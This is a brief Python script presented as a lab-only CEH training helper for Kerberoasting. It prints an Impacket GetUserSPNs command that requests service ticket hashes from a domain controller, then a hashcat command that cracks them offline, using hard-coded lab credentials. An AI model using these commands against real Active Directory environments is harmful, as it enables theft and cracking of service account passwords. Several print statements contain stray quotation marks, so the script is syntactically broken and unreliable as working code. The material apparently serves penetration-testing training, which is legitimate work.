#!/usr/bin/env python3
# LAB-ONLY: Kerberoasting Helper
# CEH v13 Master Module 06
# STRICTLY FOR AUTHORIZED LAB USE ONLY!
# DETAILED EXPLANATION: Generates commands for Kerberoasting with Impacket!
import sys

# -------------------------- EDIT THESE VALUES FOR YOUR LAB --------------------------
LAB_DOMAIN = "lab-domain.local"
LAB_DOMAIN_CONTROLLER = "192.168.100.10"
LAB_USER = "lab-user"
LAB_PASS = "lab-pass123"
# -----------------------------------------------------------------------------------

def main():
    print("="*80)
    print("LAB-ONLY: Kerberoasting Helper")
    print("="*80")
    print("-"*80")
    print("[*] Commands to run:")
    print("-"*80")
    print("# 1. Find SPNs:")
    print(f"   GetUserSPNs.py {LAB_DOMAIN}/{LAB_USER}:{LAB_PASS} -dc-ip {LAB_DOMAIN_CONTROLLER} -request")
    print("# 2. Crack with hashcat:")
    print("   hashcat -m 13100 kerberoast.hash wordlist.txt")
    print("-"*80")

if __name__ == "__main__":
    main()
